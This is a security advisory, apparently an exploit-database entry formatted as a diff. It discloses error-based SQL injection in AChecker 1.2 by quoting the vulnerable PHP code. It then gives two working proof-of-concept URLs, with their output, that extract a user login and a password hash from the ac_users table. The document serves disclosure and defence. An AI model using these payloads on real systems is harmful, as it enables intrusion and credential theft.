@@ -1,0 +1,96 @@
+AChecker 1.2 Multiple Error-Based SQL Injection vulnerabilities
+
+
+Vendor: ATutor (Inclusive Design Institute)
+Product web page: http://www.atutor.ca
+Affected version: 1.2 (build r530)
+
+Summary: AChecker is an open source Web accessibility evaluation tool.
+It can be used to review the accessibility of Web pages based on a variety
+international accessibility guidelines.
+
+Desc: Input passed via the parameter 'myown_patch_id' in '/updater/patch_edit.php'
+and the parameter 'id' in '/user/user_create_edit.php' script is not properly
+sanitised before being used in SQL queries. This can be exploited to manipulate
+SQL queries by injecting arbitrary SQL code.
+
+
+==========================================================================
+
+/updater/patch_edit.php:
+------------------------------
+
+20: if (!isset($_REQUEST["myown_patch_id"]))
+21: {
+22:         $msg->addError('NO_ITEM_SELECTED');
+23:         exit;
+24: }
+25: 
+26: $myown_patch_id = $_REQUEST["myown_patch_id"];
+27: 
+28: $myownPatchesDAO = new MyownPatchesDAO();
+29: $myownPatchesDependentDAO = new MyownPatchesDependentDAO();
+30: $myownPatchesFilesDAO = new MyownPatchesFilesDAO();
+31: 
+32: // URL called by form action
+33: $savant->assign('url', dirname($_SERVER['PHP_SELF']) . "/patch_creator.php?myown_patch_id=" . $myown_patch_id);
+34: 
+35: $savant->assign('patch_row', $myownPatchesDAO->getByID($myown_patch_id));
+36: $savant->assign('dependent_rows', $myownPatchesDependentDAO->getByPatchID($myown_patch_id));
+37: $savant->assign('file_rows', $myownPatchesFilesDAO->getByPatchID($myown_patch_id));
+
+
+------------------------------------------------------------------------
+
+/user/user_create_edit.php:
+------------------------------
+
+103: if (isset($_GET['id'])) // edit existing user
+104: {
+105:         $usersDAO = new UsersDAO();
+106:         $savant->assign('user_row', $usersDAO->getUserByID($_GET['id']));
+107:         $savant->assign('show_password', false);
+108: 
+109: }
+
+==========================================================================
+
+
+Tested on: Microsoft Windows XP Professional SP3 (EN)
+           Apache 2.2.14 (Win32)
+           PHP 5.3.1
+           MySQL 5.1.41
+
+
+Vulnerabilities discovered by Gjoko 'LiquidWorm' Krstic
+                              liquidworm gmail com
+                              Zero Science Lab - http://www.zeroscience.mk
+
+
+Advisory ID: ZSL-2011-5034
+Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2011-5034.php
+
+
+01.08.2011
+
+--
+
+PoC:
+
+
+- http://localhost/updater/patch_edit.php?myown_patch_id=1 and(select 1 from(select count(*),concat((select (select login) from `ac_users` limit 1,1),floor(rand(0)*2))x from `information_schema`.tables group by 2)j)
+
++ Output:
+
+Duplicate entry 'admin1' for key 'group_key'
+
+
+-==========================-
+
+
+- http://localhost/user/user_create_edit.php?id=78 and(select 1 from(select count(*),concat((select (select password) from `ac_users` limit 1,1),floor(rand(0)*2))x from `information_schema`.tables group by 2)j)
+
++ Ouput:
+
+Duplicate entry 'd033e22ae348aeb5660fc2140aec35850c4da9971' for key 'group_key'
+
